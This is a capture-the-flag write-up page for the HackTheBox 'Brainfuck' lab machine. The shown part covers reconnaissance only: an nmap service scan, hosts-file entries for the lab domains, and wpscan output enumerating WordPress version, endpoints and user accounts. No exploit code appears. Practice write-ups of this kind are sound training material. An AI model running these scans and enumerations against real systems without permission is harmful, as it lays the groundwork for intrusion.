@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Brainfuck | This was really a Brainfuck. It requires some knowledge of cryptography for you to be able to recognize patterns and get on the right track....">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Brainfuck</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2019-12-18 19:05:00+00:00">Wed 18 December 2019</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Brainfuck.html">Brainfuck</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Brainfuck.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>This was really a Brainfuck. It requires some knowledge of cryptography for you to be able to recognize patterns and get on the right track. Although I found it a bit unrealistic it is still a good box to practice your skills. My suggestion is always to try hard yourself and only when you have been stuck for a considerable amount of time look for hints.</p>
+<h1>Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="mf">10.10.10.17</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2019</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span><span class="w"> </span><span class="mi">07</span><span class="err">:</span><span class="mi">10</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">brainfuck</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.17</span><span class="p">)</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.13</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">995</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
+<span class="n">PORT</span><span class="w">    </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">  </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">      </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mf">7.2</span><span class="n">p2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="n">ubuntu2</span><span class="mf">.1</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mf">2.0</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="nl">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">2048</span><span class="w"> </span><span class="mi">94</span><span class="err">:</span><span class="nl">d0</span><span class="p">:</span><span class="nl">b3</span><span class="p">:</span><span class="mi">34</span><span class="err">:</span><span class="nl">e9</span><span class="p">:</span><span class="nl">a5</span><span class="p">:</span><span class="mi">37</span><span class="err">:</span><span class="nl">c5</span><span class="p">:</span><span class="nl">ac</span><span class="p">:</span><span class="nl">b9</span><span class="p">:</span><span class="mi">80</span><span class="err">:</span><span class="nl">df</span><span class="p">:</span><span class="mi">2</span><span class="nl">a</span><span class="p">:</span><span class="mi">54</span><span class="err">:</span><span class="nl">a5</span><span class="p">:</span><span class="n">f0</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="mi">6</span><span class="nl">b</span><span class="p">:</span><span class="nl">d5</span><span class="p">:</span><span class="nl">dc</span><span class="p">:</span><span class="mi">15</span><span class="err">:</span><span class="mi">3</span><span class="nl">a</span><span class="p">:</span><span class="mi">66</span><span class="err">:</span><span class="mi">7</span><span class="nl">a</span><span class="p">:</span><span class="nl">f4</span><span class="p">:</span><span class="mi">19</span><span class="err">:</span><span class="mi">91</span><span class="err">:</span><span class="mi">5</span><span class="nl">d</span><span class="p">:</span><span class="mi">73</span><span class="err">:</span><span class="mi">85</span><span class="err">:</span><span class="nl">b2</span><span class="p">:</span><span class="mi">4</span><span class="nl">c</span><span class="p">:</span><span class="n">b2</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">23</span><span class="err">:</span><span class="nl">f5</span><span class="p">:</span><span class="nl">a3</span><span class="p">:</span><span class="mi">33</span><span class="err">:</span><span class="mi">33</span><span class="err">:</span><span class="mi">9</span><span class="nl">d</span><span class="p">:</span><span class="mi">76</span><span class="err">:</span><span class="nl">d5</span><span class="p">:</span><span class="nl">f2</span><span class="p">:</span><span class="nl">ea</span><span class="p">:</span><span class="mi">69</span><span class="err">:</span><span class="mi">71</span><span class="err">:</span><span class="nl">e3</span><span class="p">:</span><span class="mi">4</span><span class="nl">e</span><span class="p">:</span><span class="mi">8</span><span class="nl">e</span><span class="p">:</span><span class="mi">02</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w"></span>
+<span class="mi">25</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">smtp</span><span class="w">     </span><span class="k">Postfix</span><span class="w"> </span><span class="n">smtpd</span><span class="w"></span>
+<span class="o">|</span><span class="n">_smtp</span><span class="o">-</span><span class="nl">commands</span><span class="p">:</span><span class="w"> </span><span class="n">brainfuck</span><span class="p">,</span><span class="w"> </span><span class="n">PIPELINING</span><span class="p">,</span><span class="w"> </span><span class="k">SIZE</span><span class="w"> </span><span class="mi">10240000</span><span class="p">,</span><span class="w"> </span><span class="n">VRFY</span><span class="p">,</span><span class="w"> </span><span class="n">ETRN</span><span class="p">,</span><span class="w"> </span><span class="n">STARTTLS</span><span class="p">,</span><span class="w"> </span><span class="n">ENHANCEDSTATUSCODES</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="n">BITMIME</span><span class="p">,</span><span class="w"> </span><span class="n">DSN</span><span class="p">,</span><span class="w"> </span>
+<span class="mi">110</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">pop3</span><span class="w">     </span><span class="n">Dovecot</span><span class="w"> </span><span class="n">pop3d</span><span class="w"></span>
+<span class="o">|</span><span class="n">_pop3</span><span class="o">-</span><span class="nl">capabilities</span><span class="p">:</span><span class="w"> </span><span class="n">UIDL</span><span class="w"> </span><span class="n">AUTH</span><span class="o">-</span><span class="n">RESP</span><span class="o">-</span><span class="n">CODE</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="n">CAPA</span><span class="w"> </span><span class="n">SASL</span><span class="p">(</span><span class="n">PLAIN</span><span class="p">)</span><span class="w"> </span><span class="n">PIPELINING</span><span class="w"> </span><span class="n">RESP</span><span class="o">-</span><span class="n">CODES</span><span class="w"> </span><span class="k">TOP</span><span class="w"></span>
+<span class="mi">143</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">imap</span><span class="w">     </span><span class="n">Dovecot</span><span class="w"> </span><span class="n">imapd</span><span class="w"></span>
+<span class="o">|</span><span class="n">_imap</span><span class="o">-</span><span class="nl">capabilities</span><span class="p">:</span><span class="w"> </span><span class="n">IDLE</span><span class="w"> </span><span class="n">LOGIN</span><span class="o">-</span><span class="n">REFERRALS</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">IMAP4rev1</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">OK</span><span class="w"> </span><span class="n">Pre</span><span class="o">-</span><span class="n">login</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="n">post</span><span class="o">-</span><span class="n">login</span><span class="w"> </span><span class="n">SASL</span><span class="o">-</span><span class="n">IR</span><span class="w"> </span><span class="n">listed</span><span class="w"> </span><span class="n">LITERAL</span><span class="o">+</span><span class="w"> </span><span class="n">capabilities</span><span class="w"> </span><span class="n">ENABLE</span><span class="w"> </span><span class="n">AUTH</span><span class="o">=</span><span class="n">PLAINA0001</span><span class="w"></span>
+<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">http</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="mf">1.10.0</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header</span><span class="p">:</span><span class="w"> </span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.10.0</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="mi">400</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">plain</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">sent</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">HTTPS</span><span class="w"> </span><span class="n">port</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="nl">cert</span><span class="p">:</span><span class="w"> </span><span class="nl">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">brainfuck</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">Brainfuck</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">Attica</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">GR</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">Subject</span><span class="w"> </span><span class="n">Alternative</span><span class="w"> </span><span class="nl">Name</span><span class="p">:</span><span class="w"> </span><span class="nl">DNS</span><span class="p">:</span><span class="n">www</span><span class="p">.</span><span class="n">brainfuck</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="nl">DNS</span><span class="p">:</span><span class="n">sup3rs3cr3t</span><span class="p">.</span><span class="n">brainfuck</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="ow">Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="k">before</span><span class="err">:</span><span class="w"> </span><span class="mi">2017</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">13</span><span class="nl">T11</span><span class="p">:</span><span class="mi">19</span><span class="err">:</span><span class="mi">29</span><span class="w"></span>
+<span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="k">after</span><span class="err">:</span><span class="w">  </span><span class="mi">2027</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">11</span><span class="nl">T11</span><span class="p">:</span><span class="mi">19</span><span class="err">:</span><span class="mi">29</span><span class="w"></span>
+<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nc">date</span><span class="err">:</span><span class="w"> </span><span class="n">TLS</span><span class="w"> </span><span class="n">randomness</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">represent</span><span class="w"> </span><span class="nc">time</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">tls</span><span class="o">-</span><span class="nl">alpn</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">http</span><span class="o">/</span><span class="mf">1.1</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">tls</span><span class="o">-</span><span class="nl">nextprotoneg</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">http</span><span class="o">/</span><span class="mf">1.1</span><span class="w"></span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="k">Host</span><span class="err">:</span><span class="w">  </span><span class="n">brainfuck</span><span class="p">;</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w"></span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">58.10</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>From the initial nmap we can observe five open ports, one of which (443) points to a webserver. Let us have a look at it.</p>
+<p><img alt="" src="../images/brainfuck-nginx.png"></p>
+<p>We can see the simple Nginix welcome page. From the nmap we can also see two alternative DNS names: <strong>www.brainfuck.htb</strong> and <strong>sup3rs3cr3t.brainfuck.htb</strong>. To be able to see what's behind these names we can add an entry to our personal box so that it can resolve them.</p>
+<div class="highlight"><pre><span></span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>       <span class="n">localhost</span>
+<span class="p">::</span><span class="mi">1</span>             <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span> <span class="n">Kali</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span>         <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span>         <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> <span class="n">Kali</span>
+<span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">17</span> <span class="n">brainfuck</span><span class="p">.</span><span class="n">htb</span> <span class="n">www</span><span class="p">.</span><span class="n">brainfuck</span><span class="p">.</span><span class="n">htb</span> <span class="n">sup3rs3cr3t</span><span class="p">.</span><span class="n">brainfuck</span><span class="p">.</span><span class="n">htb</span>
+</pre></div>
+
+
+<p>So now we can try to navigate to the first website with our browser:</p>
+<p><img alt="" src="../images/brainfuck-wp.png"></p>
+<p>We can see what it looks like a wordpress website and another potential useful information could be the email <strong>orestis@brainfuck.htb</strong>.</p>
+<p>Since we are apparently dealing with wordpress then we can use the powerful <a href="https://wpscan.org/">wpscan</a> tool to check for vulnerabilities or other weaknessed we can leverage.</p>
+<p>As I initilally got TLS errors I then ran a scan with the tls checks option disabled:</p>
+<div class="highlight"><pre><span></span><span class="n">_______________________________________________________________</span><span class="w"></span>
+<span class="w">         </span><span class="n">__</span><span class="w">          </span><span class="n">_______</span><span class="w">   </span><span class="n">_____</span><span class="w"></span>
+<span class="w">         </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w">        </span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w">  </span><span class="n">__</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">____</span><span class="o">|</span><span class="w"></span>
+<span class="w">          </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="w"> </span><span class="o">/|</span><span class="w"> </span><span class="o">|</span><span class="n">__</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">___</span><span class="w">   </span><span class="n">___</span><span class="w">  </span><span class="n">__</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">__</span><span class="w"> </span><span class="err">®</span><span class="w"></span>
+<span class="w">           </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="o">/</span><span class="w">  </span><span class="err">\</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">___</span><span class="o">/</span><span class="w"> </span><span class="err">\</span><span class="n">___</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">__</span><span class="o">|/</span><span class="w"> </span><span class="n">_</span><span class="err">`</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="s1">&#39;_ \</span>
+<span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |</span>
+<span class="s1">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
+
+<span class="s1">         WordPress Security Scanner by the WPScan Team</span>
+<span class="s1">                         Version 3.7.5</span>
+<span class="s1">       Sponsored by Automattic - https://automattic.com/</span>
+<span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span>
+<span class="s1">_______________________________________________________________</span>
+
+<span class="s1">[32m[+][0m URL: https://brainfuck.htb/</span>
+<span class="s1">[32m[+][0m Started: Fri Dec 27 05:59:53 2019</span>
+
+<span class="s1">Interesting Finding(s):</span>
+
+<span class="s1">[32m[+][0m https://brainfuck.htb/</span>
+<span class="s1"> | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)</span>
+<span class="s1"> | Found By: Headers (Passive Detection)</span>
+<span class="s1"> | Confidence: 100%</span>
+
+<span class="s1">[32m[+][0m https://brainfuck.htb/xmlrpc.php</span>
+<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="s1"> | Confidence: 100%</span>
+<span class="s1"> | References:</span>
+<span class="s1"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span>
+<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span>
+<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span>
+<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span>
+<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span>
+
+<span class="s1">[32m[+][0m https://brainfuck.htb/readme.html</span>
+<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="s1"> | Confidence: 100%</span>
+
+<span class="s1">[32m[+][0m https://brainfuck.htb/wp-cron.php</span>
+<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="s1"> | Confidence: 60%</span>
+<span class="s1"> | References:</span>
+<span class="s1"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span>
+<span class="s1"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span>
+
+<span class="s1">[32m[+][0m WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).</span>
+<span class="s1"> | Found By: Rss Generator (Passive Detection)</span>
+<span class="s1"> |  - https://brainfuck.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;</span>
+<span class="s1"> |  - https://brainfuck.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;</span>
+
+<span class="s1">[32m[+][0m WordPress theme in use: proficient</span>
+<span class="s1"> | Location: https://brainfuck.htb/wp-content/themes/proficient/</span>
+<span class="s1"> | Last Updated: 2019-12-13T00:00:00.000Z</span>
+<span class="s1"> | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt</span>
+<span class="s1"> | [33m[!][0m The version is out of date, the latest version is 3.0.5</span>
+<span class="s1"> | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3</span>
+<span class="s1"> | Style Name: Proficient</span>
+<span class="s1"> | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...</span>
+<span class="s1"> | Author: Specia</span>
+<span class="s1"> | Author URI: https://speciatheme.com/</span>
+<span class="s1"> |</span>
+<span class="s1"> | Found By: Css Style In Homepage (Passive Detection)</span>
+<span class="s1"> |</span>
+<span class="s1"> | Version: 1.0.6 (80% confidence)</span>
+<span class="s1"> | Found By: Style (Passive Detection)</span>
+<span class="s1"> |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: &#39;</span><span class="nl">Version</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0.6</span><span class="err">&#39;</span><span class="w"></span>
+
+<span class="err"></span><span class="o">[</span><span class="n">32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Enumerating Vulnerable Plugins (via Passive Methods)</span>
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Checking Plugin Versions (via Passive and Aggressive Methods)</span>
+
+<span class="n">[34m[i</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m No plugins Found.</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span>
+
+<span class="n"> Checking Known Locations -: |=======================================================|</span>
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Checking Theme Versions (via Passive and Aggressive Methods)</span>
+
+<span class="n">[34m[i</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m No themes Found.</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Enumerating Timthumbs (via Passive and Aggressive Methods)</span>
+
+<span class="n"> Checking Known Locations -: |=======================================================|</span>
+
+<span class="n">[34m[i</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m No Timthumbs Found.</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Enumerating Config Backups (via Passive and Aggressive Methods)</span>
+
+<span class="n"> Checking Config Backups -: |========================================================|</span>
+
+<span class="n">[34m[i</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m No Config Backups Found.</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Enumerating DB Exports (via Passive and Aggressive Methods)</span>
+
+<span class="n"> Checking DB Exports -: |============================================================|</span>
+
+<span class="n">[34m[i</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m No DB Exports Found.</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span>
+
+<span class="n"> Brute Forcing Attachment IDs -: |===================================================|</span>
+
+<span class="n">[34m[i</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m No Medias Found.</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m Enumerating Users (via Passive and Aggressive Methods)</span>
+
+<span class="n"> Brute Forcing Author IDs -: |=======================================================|</span>
+
+<span class="n">[34m[i</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m User(s) Identified:</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m admin</span>
+<span class="n"> | Found By: Author Posts - Display Name (Passive Detection)</span>
+<span class="n"> | Confirmed By:</span>
+<span class="n"> |  Rss Generator (Passive Detection)</span>
+<span class="n"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span>
+<span class="n"> |  Login Error Messages (Aggressive Detection)</span>
+
+<span class="n">[32m[+</span><span class="o">]</span><span class="err"></span><span class="o">[</span><span class="n">0m administrator</span>
+<span class="n"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span>
+<span class="n"> | Confirmed By: Login Error Messages (Aggressive Detection)</span>
+
